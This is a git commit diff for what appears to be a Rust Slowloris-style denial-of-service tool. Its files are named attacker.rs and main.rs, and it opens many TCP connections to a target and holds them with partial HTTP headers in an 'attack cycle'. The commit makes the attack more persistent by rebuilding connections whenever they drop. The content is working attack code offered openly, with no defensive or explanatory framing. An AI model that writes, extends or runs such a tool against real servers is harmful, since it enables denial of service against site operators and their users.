d9c898bef809bac69b163c858a72ed7077d76a02
Luna Kilborn <leland.kilborn@hotmail.com>
2023-02-12 15:58:55 -0500

    Add connection rebuilding on drop

--- src/attacker.rs
+++ src/attacker.rs
@@ -5,9 +5,9 @@ pub fn resolve_address(address: String) -> Result<IpAddr, AddrParseError> {
     return address.parse();
 }
 
-pub fn make_connections(target: IpAddr, port: u16,  socket_num: u16) -> Result<Vec<TcpStream>, Vec<Error>> {
+pub fn make_connections(target: IpAddr, port: u16,  socket_num: u16) -> Result<Vec<TcpStream>, Error> {
     let mut connections: Vec<TcpStream> = Vec::new();
-    let mut errors: Vec<Error> = Vec::new();
+    let mut last_error: Error = Error::new(std::io::ErrorKind::Other, "");
     for _ in 0..socket_num {
         let connection = match target {
             IpAddr::V4(x) => TcpStream::connect((x, port)),
@@ -15,11 +15,11 @@ pub fn make_connections(target: IpAddr, port: u16,  socket_num: u16) -> Result<V
         };
         match connection {
             Ok(x) => connections.push(x),
-            Err(x) => errors.push(x),
+            Err(x) => last_error = x,
         }
     }
     if connections.is_empty() {
-        return Err(errors);
+        return Err(last_error);
     } else {
         return Ok(connections);
     }
@@ -37,4 +37,42 @@ pub fn send_header(stream: &mut TcpStream) -> Result<(), Error> {
         Ok(_) => return Ok(()),
         Err(e) => return Err(e),
     }
+}
+
+pub fn send_headers(streams: &mut Vec<TcpStream>) -> Result<(), Error> {
+    for i in 0..streams.len() {
+        send_header(&mut streams[i])?;
+    }
+    return Ok(());
+}
+
+pub fn new_batch(target: IpAddr, port: u16, socket_num: u16) -> Result<Vec<TcpStream>, Error> {
+    // Create connections
+    println!("[*] Creating {} connections", socket_num);
+    let mut streams: Vec<TcpStream>;
+    match make_connections(target, port, socket_num) {
+        Ok(s) => {
+            println!("[*] Connections successful");
+            streams = s;
+        }
+        Err(e) => {
+            println!("[!] Error while creating connections ---- {}", e);
+            return Err(e);
+        }
+    };
+
+    // Send intial GET request line
+    println!("[*] Preparing streams");
+    for i in 0..streams.len() {
+        match prepare_stream(&mut streams[i]) {
+            Ok(_) => (),
+            Err(e) => {
+                println!("[!] Error while preparing stream ---- {}", e);
+                return Err(e);
+            }
+        }
+    }
+    println!("[*] Prepared streams");
+
+    return Ok(streams);
 }
--- src/main.rs
+++ src/main.rs
@@ -1,8 +1,6 @@
 mod arg_parser;
 mod attacker;
 
-use std::net::TcpStream;
-
 use arg_parser::{Args, Parser};
 
 fn main() {
@@ -14,50 +12,28 @@ fn main() {
     let addr = match attacker::resolve_address(args.target) {
         Ok(a) => a,
         Err(_) => {
-            println!("[!] Error resolving address"); 
-            std::process::exit(1);
-        },
-    };
-
-    // Create connections
-    println!("[*] Creating {} connections", args.socket_num);
-    let mut streams: Vec<TcpStream>;
-    match attacker::make_connections(addr, args.port, args.socket_num) {
-        Ok(s) => {
-            println!("[*] Connections successful");
-            streams = s;
-        }
-        Err(e) => {
-            println!("[!] Errors have occurred:");
-            for i in e {
-                println!("[!] ---- {}", i);
-            }
+            println!("[!] Error resolving address");
             std::process::exit(1);
         }
     };
 
-    // Send intial GET request line
-    println!("[*] Preparing streams");
-    for i in 0..streams.len() {
-        match attacker::prepare_stream(&mut streams[i]) {
-            Ok(_) => (),
-            Err(e) => {
-                println!("[!] Error while preparing stream ---- {}", e);
-                std::process::exit(1);
-            }
-        }
+    let mut streams;
+    match attacker::new_batch(addr, args.port, args.socket_num) {
+        Ok(s) => streams = s,
+        Err(_) => std::process::exit(1),
     }
-    println!("[*] Prepared streams");
 
     // Enter attack cycle
     println!("[*] Attacking");
     loop {
-        for i in 0..streams.len() {
-            match attacker::send_header(&mut streams[i]) {
-                Ok(_) => (),
-                Err(e) => {
-                    println!("[!] Error during header send ---- {}", e);
-                    std::process::exit(1);
+        match attacker::send_headers(&mut streams) {
+            Ok(_) => (),
+            Err(e) => {
+                println!("[!] Error during header send ---- {}", e);
+                println!("[*] Rebuilding connections");
+                match attacker::new_batch(addr, args.port, args.socket_num) {
+                    Ok(s) => streams = s,
+                    Err(_) => std::process::exit(1),
                 }
             }
         }
